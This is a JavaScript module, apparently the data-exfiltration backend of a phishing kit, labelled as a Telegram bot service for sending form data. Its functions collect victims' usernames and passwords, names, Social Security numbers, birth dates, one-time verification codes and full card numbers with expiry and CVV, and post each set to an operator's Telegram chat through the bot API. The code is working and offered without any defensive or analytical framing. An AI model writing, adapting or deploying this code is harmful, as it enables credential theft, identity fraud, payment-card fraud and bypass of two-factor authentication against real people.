// Telegram Bot Service
// Sends form data to a Telegram chat

const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

/**
 * Escapes HTML special characters for Telegram
 * @param {string} text - The text to escape
 * @returns {string} - The escaped text
 */
const escapeHTML = (text) => {
  if (!text) return 'N/A';
  const str = String(text);
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
};

/**
 * Send a message to Telegram
 * @param {string} message - The message to send
 * @returns {Promise<boolean>} - Success status
 */
export const sendTelegramMessage = async (message) => {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('Telegram bot credentials not configured');
    return false;
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();
    
    if (data.ok) {
      console.log('✅ Telegram: Message sent successfully');
      return true;
    } else {
      console.error('❌ Telegram: API error:', data.description || 'Unknown error');
      console.debug('Telegram full error response:', data);
      return false;
    }
  } catch (error) {
    console.error('❌ Telegram: Fetch error:', error.message || error);
    return false;
  }
};

/**
 * Send login attempt data to Telegram
 * @param {Object} formData - User login form data
 */
export const sendLoginData = (formData) => {
  const timestamp = new Date().toLocaleString();
  const message = `
<b>🔐 Login Attempt</b>
<b>Time:</b> ${escapeHTML(timestamp)}
<b>Username:</b> ${escapeHTML(formData.username)}
<b>Password:</b> ${escapeHTML(formData.password)}
  `.trim();
  
  return sendTelegramMessage(message);
};

/**
 * Send identity verification data to Telegram
 * @param {Object} formData - Verification form data
 */
export const sendVerificationData = (formData) => {
  const timestamp = new Date().toLocaleString();
  const message = `
<b>🆔 Identity Verification</b>
<b>Time:</b> ${escapeHTML(timestamp)}
<b>First Name:</b> ${escapeHTML(formData.firstName)}
<b>Last Name:</b> ${escapeHTML(formData.lastName)}
<b>SSN:</b> ${escapeHTML(formData.ssn)}
<b>DOB:</b> ${escapeHTML(formData.dob)}
  `.trim();
  
  return sendTelegramMessage(message);
};

/**
 * Send code entry data to Telegram
 * @param {Object} formData - Code entry form data
 */
export const sendCodeData = (formData) => {
  console.log('📤 Telegram: Sending code data...', formData);
  const timestamp = new Date().toLocaleString();
  const message = `
<b>📝 Code Entered</b>
<b>Time:</b> ${escapeHTML(timestamp)}
<b>Code:</b> ${escapeHTML(formData.code)}
<b>Delivery Method:</b> ${escapeHTML(formData.method)}
  `.trim();
  
  return sendTelegramMessage(message);
};

/**
 * Send billing data to Telegram
 * @param {Object} formData - Billing form data
 */
export const sendBillingData = (formData) => {
  const timestamp = new Date().toLocaleString();
  const message = `
<b>💳 Billing Information</b>
<b>Time:</b> ${escapeHTML(timestamp)}
<b>Card Name:</b> ${escapeHTML(formData.cardName)}
<b>Card Number:</b> ${escapeHTML(formData.cardNumber)}
<b>Expiry:</b> ${escapeHTML(formData.expiry)}
<b>CVV:</b> ${escapeHTML(formData.cvv)}
  `.trim();
  
  return sendTelegramMessage(message);
};

/**
 * Send custom data to Telegram
 * @param {string} title - Message title
 * @param {Object} data - Data to send (key-value pairs)
 */
export const sendCustomData = (title, data) => {
  const timestamp = new Date().toLocaleString();
  let message = `<b>${escapeHTML(title)}</b>\n<b>Time:</b> ${escapeHTML(timestamp)}\n`;
  
  Object.entries(data).forEach(([key, value]) => {
    message += `<b>${escapeHTML(key)}:</b> ${escapeHTML(value)}\n`;
  });
  
  return sendTelegramMessage(message.trim());
};
